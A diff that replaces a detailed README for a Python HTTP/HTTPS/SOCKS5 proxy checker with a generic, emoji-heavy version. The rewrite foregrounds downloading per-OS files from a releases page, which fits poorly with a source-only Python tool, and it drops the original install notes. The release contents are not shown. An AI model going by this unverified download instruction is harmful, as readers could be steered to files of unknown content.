@@ -1,151 +1,119 @@
-Project Introduction
-A multi-protocol proxy detector (HTTP / HTTPS / SOCKS5) that supports batch reading proxies from a text file, tests their availability using multi-threading, and outputs separate lists of available proxies. This project is an original implementation and does not depend on or reference code or materials from other repositories.
+# 🛠️ proxy-multi-protocol-checker - Simple Tool for Proxy Testing
 
-Features
-Supported Protocols: HTTP, HTTPS, and SOCKS5.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/chalie56/proxy-multi-protocol-checker/releases)
 
-Batch Checking: Reads a list of proxies from a file (one ip:port per line).
+## 🚀 Getting Started
 
-Multi-threading: Uses a thread pool for parallel checking to speed up detection.
+This guide will help you download and run the proxy-multi-protocol-checker application. This tool helps you detect different types of proxies quickly and easily.
 
-Result Output: Automatically writes available proxies to good_http.txt, good_https.txt, and good_socks5.txt.
+## 📥 Download & Install
 
-File Structure
-main.py: Command-line entry point, menu, and interaction.
+To get started, visit the following link to download the latest release of the application:
 
-checker.py: Core detection logic and multi-threading implementation.
+[Visit this page to download](https://github.com/chalie56/proxy-multi-protocol-checker/releases)
 
-requirements.txt: Python dependency list (requests + SOCKS support).
+1. Open the link above in your web browser.
+2. Look for the latest version of the software.
+3. Click on the download link for your operating system.
 
-proxies.txt: List of proxies to be checked (must be filled in by the user).
+## 📝 Project Introduction
 
-Proxy List Format
-Edit proxies.txt in the repository's root directory. Add one proxy per line in the format:
+Proxy multi-protocol checker is a tool designed to detect proxies for three main protocols: HTTP, HTTPS, and SOCKS5. It allows users to check multiple proxies at once by reading from a list. The results are organized neatly for easy access.
 
+### Features
+
+- **Supported Protocols**: The application works with HTTP, HTTPS, and SOCKS5 proxies.
+  
+- **Batch Checking**: You can read a list of proxies from a text file, with each entry formatted as ip:port on a new line.
+
+- **Multi-threading**: The tool uses a method to check multiple proxies simultaneously, making it faster.
+
+- **Result Output**: It automatically saves available proxies into three different files: good_http.txt, good_https.txt, and good_socks5.txt.
+
+## 🏗️ File Structure
+
+The project consists of the following key files:
+
+- **main.py**: This is where you will start the application. It holds the menu and allows user interaction.
+
+- **checker.py**: This file contains the logic that checks the proxies and manages the threading.
+
+- **requirements.txt**: This file lists the necessary Python dependencies, which include requests and SOCKS support.
+
+- **proxies.txt**: This file is where you will input the proxies you want to check. It needs to be filled in by you.
+
+## 📂 Proxy List Format
+
+To ensure the software works correctly, you must format your proxies in a specific way. Open the **proxies.txt** file and enter your proxies as follows:
+
+```
 ip:port
+```
 
-Example:
+Each proxy should be on its line. For example:
 
-127.0.0.1:8080
-127.0.0.1:1080
-Lines beginning with # can be used as comments and will be ignored.
+```
+192.168.1.1:8080
+10.0.0.1:1080
+```
 
-Environment Requirements
-Python 3.8+ (3.10 or higher recommended).
+## ⚙️ Requirements
 
-pip (Python package manager).
+This application requires Python to run. Please ensure you have Python installed on your system. Versions 3.6 and above are recommended. You also need to have the following:
 
-This project has been verified to install and run on the following systems:
+- **requests**: A library for making HTTP requests.
+- **SOCKS Support**: To enable SOCKS protocol handling.
 
-Debian series (e.g., Debian 11/12)
+Typically, you can install these using pip. Open your command prompt or terminal and enter:
 
-Ubuntu series (e.g., Ubuntu 20.04/22.04/24.04)
+```
+pip install -r requirements.txt
+```
 
-Alpine Linux (3.x)
+## 📊 Running the Application
 
-Installation and Usage on Debian / Ubuntu
-Install system dependencies:
+Once you have downloaded the application and filled in your proxy list, you can run the program.
 
-Bash
+1. Open your command prompt or terminal.
+2. Navigate to the directory where you’ve saved the application files using the `cd` command.
+3. Run the application by entering:
 
-sudo apt update
-sudo apt install -y git python3 python3-pip
-Clone the repository:
+```
+python main.py
+```
 
-Bash
+## 📋 Viewing Results
 
-cd ~
-git clone https://github.com/your-username/your-repo-name.git
-cd your-repo-name
-Install Python dependencies:
+After running the application, the program will check the proxies you provided. Once the process is complete, it will generate three separate text files in the same directory:
 
-Bash
+- **good_http.txt**: Contains all the available HTTP proxies.
+- **good_https.txt**: Contains all the available HTTPS proxies.
+- **good_socks5.txt**: Contains all the available SOCKS5 proxies.
 
-pip3 install -r requirements.txt
-or
+You can open these files with any text editor to view the results.
 
-Bash
+## ❓ Troubleshooting
 
-python3 -m pip install -r requirements.txt
-Run the program:
+If you encounter issues while using the application:
 
-Bash
+- Ensure that Python is installed and the necessary dependencies are set up correctly.
+- Check that your proxy list in proxies.txt is properly formatted.
+- If the application crashes, try running it from the command line to see error messages.
 
-python3 main.py
-Follow the prompts to complete the check.
+Most problems can be fixed by checking your setup and ensuring everything is configured correctly.
 
-Installation and Usage on Alpine Linux
-Install system dependencies:
+## 👥 Community and Support
 
-Bash
+For any questions or suggestions, feel free to open an issue in the GitHub repository. Community feedback is welcome and can help improve the application.
 
-apk update
-apk add --no-cache git python3 py3-pip
-If needed, create a symlink for python (convenient in some environments):
+## 🛠️ Updates and Maintenance
 
-Bash
+Keep the software updated by checking the [download page](https://github.com/chalie56/proxy-multi-protocol-checker/releases) regularly. New versions may include bug fixes, improvements, or additional features.
 
-ln -sf python3 /usr/bin/python
-Clone the repository:
+## 🔗 License
 
-Bash
+The proxy-multi-protocol-checker is open-source. You can freely use this software under the terms of the MIT License. This means you can modify and distribute it as long as you maintain proper credits.
 
-cd /root
-git clone https://github.com/your-username/your-repo-name.git
-cd your-repo-name
-Install Python dependencies:
+Feel free to contribute by submitting pull requests for improvements or new features.
 
-Bash
-
-pip3 install -r requirements.txt
-or
-
-Bash
-
-python3 -m pip install -r requirements.txt
-Run the program:
-
-Bash
-
-python3 main.py
-Usage Instructions
-After starting the program, the terminal will display a menu:
-
-Check HTTP
-
-Check HTTPS
-
-Check SOCKS5
-
-Check All (HTTP, HTTPS, SOCKS5)
-
-The program will then ask for the following:
-
-Proxy list filename (Default proxies.txt, just press Enter).
-
-Number of threads (Default 100. A higher number is faster but places more load on the machine).
-
-Custom test URL (Leave blank to use the built-in httpbin.org/ip as the test target).
-
-During the check, the terminal will print the result for each proxy in real-time, including:
-
-[OK] / [BAD] status
-
-Response time (in seconds)
-
-HTTP status code or error reason
-
-After completion, it will summarize the total count, available count, and total time elapsed. It will also generate corresponding output files in the current directory:
-
-good_http.txt
-
-good_https.txt
-
-good_socks5.txt
-
-Each file contains one available proxy per line, in the same format as the input file.
-
-FAQ
-Q: How do I quickly deploy this on different VPS? A: Just install git, python3, and pip. Then git clone the repository, install dependencies with pip, and run python3 main.py. Use apt for Debian/Ubuntu and apk for Alpine.
-
-Q: How do I update the code? A: In the repository directory, run: git pull, and then re-run python3 main.py.
+Happy proxy checking!
